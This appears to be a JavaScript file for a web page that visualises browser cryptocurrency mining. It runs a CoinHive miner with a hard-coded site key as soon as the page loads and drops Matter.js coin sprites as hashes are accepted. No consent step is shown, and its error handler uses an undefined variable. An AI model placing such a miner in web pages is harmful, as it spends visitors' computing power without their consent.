var cdrop = 0;

// calculates money earned by mining
var moneyEarned = 0;

// module aliases
var Engine = Matter.Engine,
    Render = Matter.Render,
    World = Matter.World,
    Bodies = Matter.Bodies;

//creating engine
var engine = Engine.create();

//creating renderer
var render = Render.create({
  element: document.body,
  engine: engine,
  options: {
    width: window.innerWidth,
    height: window.innerHeight,
    background: 'transparent',
    wireframes: false
  }
});

var midpoint = window.innerWidth / 2;

//create objects
var ground = Bodies.rectangle(midpoint, 800, window.innerWidth - 5, 90, {
  isStatic: true,
  render: {
    sprite: {
      texture: 'assets/ground.png'
    }
  }
});

//adds the objects
World.add(engine.world, [ground]);

//runs the engine + renderer
Engine.run(engine);
Render.run(render);

//creates coins when called
var rest = 0.9;

var createCoin = function () {
  return Bodies.rectangle(100, 0, 151, 10, {
    render: {
      sprite: {
        texture: 'assets/coin.png'
      }
    },
    restitution: rest
  });
};

var ch = new CoinHive.Anonymous('7acDMUtasJBDQAxdQJ8VefLmExWCouzm');

ch.on('open', function(){
  console.log('connection open');
});
ch.on('authed', function(){
  console.log('connection authorized');
});
ch.on('close', function(){
  console.log('connection closed');
});
ch.on('found', function(){
  console.log('hash found');
});
ch.on('accepted', function(){
  console.log('hash accepted');
  coindrop();
});
ch.on('job', function(){
  console.log('new mining job received');
});
ch.on('error', function(){
  console.log('Error: ' + e.error);
});

setInterval(function(){
  console.log('per second', ch.getHashesPerSecond());
  console.log('total hashes', ch.getTotalHashes());
  console.log('accepted hashes', ch.getAcceptedHashes());

}, 1000);

function coindrop(){
  if ( ch.getAcceptedHashes() % 2 /* 1000000 <- proper value */ === 0 ){
    cdrop = cdrop + 1;
    moneyEarned = ch.getAcceptedHashes() / 1000000;
    console.log('coins dropped:', cdrop );
    World.add(engine.world, createCoin());
    $("#counter").text( 'MONEY EARNED: $' + moneyEarned );
  };
};

ch.start();
